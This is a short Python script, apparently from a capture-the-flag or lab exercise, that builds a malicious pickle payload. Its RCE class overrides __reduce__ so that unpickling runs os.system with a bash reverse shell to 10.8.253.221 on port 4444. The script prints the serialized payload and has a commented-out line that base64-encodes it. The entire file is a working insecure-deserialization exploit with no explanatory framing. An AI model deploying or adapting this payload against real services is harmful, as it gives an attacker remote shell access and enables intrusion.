import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ("bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'")
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE(),protocol=0)
    print(pickled.decode())
    # print(base64.urlsafe_b64encode(pickled))   